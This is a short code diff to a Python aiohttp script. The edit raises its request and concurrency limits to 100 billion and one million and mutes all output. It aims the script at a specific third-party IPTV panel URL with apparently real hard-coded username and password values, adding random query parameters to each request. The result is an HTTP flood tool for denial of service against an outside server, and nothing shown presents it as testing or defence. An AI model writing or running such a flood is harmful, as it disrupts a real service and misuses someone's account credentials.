@@ -4,8 +4,8 @@ from aiohttp import ClientSession
 import random
 import string
 
-MAXREQ = 10000
-MAXTHREAD = 1000
+MAXREQ = 100000000000
+MAXTHREAD = 1000000
 
 def random_string(length:int=6, charset:str=string.ascii_letters+string.digits):
     return ''.join([random.choice(charset) for i in range(length)])
@@ -14,10 +14,10 @@ def random_string(length:int=6, charset:str=string.ascii_letters+string.digits):
 async def fetch(url, session):
     try:
         async with session.get(url) as response:
-
             delay = response.headers.get("DELAY")
             date = response.headers.get("DATE")
-            print("{}:{} with delay {}".format(date, response.url, delay))
+            #print("{}:{} with delay {}".format(date, response.url, delay))
+            #print(response.status)
             return await response.read()
     except:
         pass
@@ -32,6 +32,7 @@ async def bound_fetch( url, session):
 
 async def run(r):
     url = "http://venex.rocks/enigma2.php?username={}&password={}&type=get_vod_categories"
+    url="http://venex.rocks/enigma2.php?username=XJAJ1pXgQx&password=r3PKoC2XkZ&type=get_live_categories&{}={}"
     tasks = []
 
     # Create client session that will ensure we dont open new connection
